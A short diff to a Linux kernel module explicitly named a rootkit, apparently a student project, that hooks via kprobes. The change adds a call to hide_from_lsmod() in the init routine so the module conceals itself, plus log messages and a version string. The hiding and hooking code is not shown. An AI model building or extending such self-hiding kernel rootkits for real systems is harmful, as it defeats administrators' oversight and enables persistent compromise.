@@ -3,16 +3,21 @@
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("HOOOKING");
 MODULE_AUTHOR("2600 student");
+MODULE_VERSION("0.0.1");
 
 static int __init rootkit_init(void) 
 {
-    // kprobes concept
-    return kprobes_init();
+
+  printk(KERN_INFO "rootkit: init\n");
+  // kprobes concept
+  hide_from_lsmod();
+  return kprobes_init();
 }
 
 static void __exit rootkit_exit(void) 
 {
-    kprobes_exit();
+  printk(KERN_INFO "rootkit: exit\n");
+  kprobes_exit();
 }
 
 module_init(rootkit_init);
